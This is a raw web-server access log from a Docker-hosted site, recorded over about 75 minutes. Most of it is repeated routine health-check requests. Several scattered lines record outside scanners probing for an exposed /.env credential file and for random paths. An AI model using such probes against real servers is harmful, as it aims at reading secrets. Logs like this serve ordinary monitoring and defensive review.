167.71.120.76 - - [15/Dec/2023:19:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1870 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:19:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1871 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1872 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1873 "www@docker" "http://172.28.0.10:80" 1ms
54.36.115.221 - - [15/Dec/2023:19:19:34 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1874 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [15/Dec/2023:19:19:35 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1875 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:19:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1876 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1877 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1878 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1879 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1880 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1881 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1882 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1883 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1884 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:19:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1885 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1886 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:19:25:04 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1887 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:19:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1888 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1889 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:19:26:20 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1890 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:19:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1891 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1892 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1893 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1894 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1895 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1896 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1897 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:19:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1898 "www@docker" "http://172.28.0.10:80" 1ms
81.209.179.153 - - [15/Dec/2023:19:29:58 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1899 "-" "-" 0ms
81.209.179.153 - - [15/Dec/2023:19:30:16 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 1900 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:19:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1901 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1902 "www@docker" "http://172.28.0.10:80" 1ms
81.209.179.153 - - [15/Dec/2023:19:31:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1903 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:19:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1904 "www@docker" "http://172.28.0.10:80" 1ms
81.209.179.153 - - [15/Dec/2023:19:31:35 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 1905 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:19:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1906 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1907 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1908 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1909 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1910 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1911 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1912 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:19:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1913 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1914 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1915 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1916 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:19:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1917 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:19:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1918 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1919 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1920 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1921 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:19:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1922 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1923 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1924 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:19:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1925 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1926 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1927 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:19:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1928 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1929 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1930 "www@docker" "http://172.28.0.10:80" 1ms
205.210.31.57 - - [15/Dec/2023:19:43:40 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1931 "web-to-websecure@internal" "-" 0ms
205.210.31.57 - - [15/Dec/2023:19:43:40 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1932 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:19:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1933 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1934 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1935 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1936 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1937 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1938 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1939 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:19:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1940 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1941 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1942 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1943 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1944 "www@docker" "http://172.28.0.10:80" 1ms
75.104.92.241 - - [15/Dec/2023:19:49:42 +0000] "GET /trace/ HTTP/2.0" 200 2262 "-" "-" 1945 "livetrace@docker" "http://172.28.0.5:80" 6ms
75.104.92.241 - - [15/Dec/2023:19:49:43 +0000] "GET /trace/styles.css?version=0.7 HTTP/2.0" 304 0 "-" "-" 1946 "livetrace@docker" "http://172.28.0.5:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1947 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1948 "www@docker" "http://172.28.0.10:80" 0ms
75.104.92.241 - - [15/Dec/2023:19:51:11 +0000] "GET /trace/ HTTP/2.0" 200 2262 "-" "-" 1949 "livetrace@docker" "http://172.28.0.5:80" 5ms
159.203.109.206 - - [15/Dec/2023:19:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1950 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1951 "www@docker" "http://172.28.0.10:80" 0ms
205.210.31.237 - - [15/Dec/2023:19:52:01 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1952 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:19:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1953 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1954 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:19:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1955 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:19:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1956 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:19:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1957 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:19:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1958 "www@docker" "http://172.28.0.10:80" 4ms
159.203.109.206 - - [15/Dec/2023:19:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1959 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:19:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1960 "www@docker" "http://172.28.0.10:80" 0ms
54.37.79.75 - - [15/Dec/2023:19:55:59 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 1961 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [15/Dec/2023:19:55:59 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 1962 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:19:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1963 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1964 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1965 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1966 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:19:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1967 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:19:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1968 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:19:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1969 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:19:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1970 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:20:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1971 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1972 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:20:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1973 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1974 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1975 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:20:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1976 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1977 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1978 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:20:04:13 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1979 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:20:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1980 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1981 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:20:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1982 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1983 "www@docker" "http://172.28.0.10:80" 1ms
77.123.15.39 - - [15/Dec/2023:20:06:07 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1984 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:20:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1985 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1986 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:20:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1987 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1988 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:20:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1989 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:20:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1990 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1991 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1992 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1993 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:20:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1994 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1995 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1996 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1997 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1998 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1999 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2000 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2001 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2002 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:20:15:22 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2003 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:20:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2004 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2005 "www@docker" "http://172.28.0.10:80" 0ms
162.221.192.26 - - [15/Dec/2023:20:16:06 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2006 "web-to-websecure@internal" "-" 0ms
162.221.192.26 - - [15/Dec/2023:20:16:06 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2007 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:20:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2008 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:20:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2009 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2010 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2011 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2012 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2013 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:20:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2014 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2015 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2016 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:20:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2017 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:20:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2018 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:20:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2019 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:20:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2020 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2021 "www@docker" "http://172.28.0.10:80" 0ms
165.22.60.26 - - [15/Dec/2023:20:22:55 +0000] "GET /aaa9 HTTP/1.1" 404 19 "-" "-" 2022 "-" "-" 0ms
165.22.60.26 - - [15/Dec/2023:20:22:55 +0000] "GET /aab8 HTTP/1.1" 404 19 "-" "-" 2023 "-" "-" 0ms
165.22.60.26 - - [15/Dec/2023:20:22:56 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2024 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:20:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2025 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:20:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2026 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:20:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2027 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2028 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:20:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2029 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2030 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2031 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2032 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2033 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:20:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2034 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:20:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2035 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:20:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2036 "www@docker" "http://172.28.0.10:80" 1ms
193.118.53.194 - - [15/Dec/2023:20:29:16 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2037 "web-to-websecure@internal" "-" 0ms
193.118.53.194 - - [15/Dec/2023:20:29:16 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2038 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:20:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2039 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2040 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2041 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2042 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2043 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2044 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2045 "www@docker" "http://172.28.0.10:80" 2ms
167.71.120.76 - - [15/Dec/2023:20:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2046 "www@docker" "http://172.28.0.10:80" 1ms
172.104.11.4 - - [15/Dec/2023:20:32:49 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2047 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:20:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2048 "www@docker" "http://172.28.0.10:80" 1ms
95.214.235.169 - - [15/Dec/2023:20:33:32 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2049 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [15/Dec/2023:20:33:32 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2050 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:20:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2051 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:20:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2052 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:20:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2053 "www@docker" "http://172.28.0.10:80" 1ms
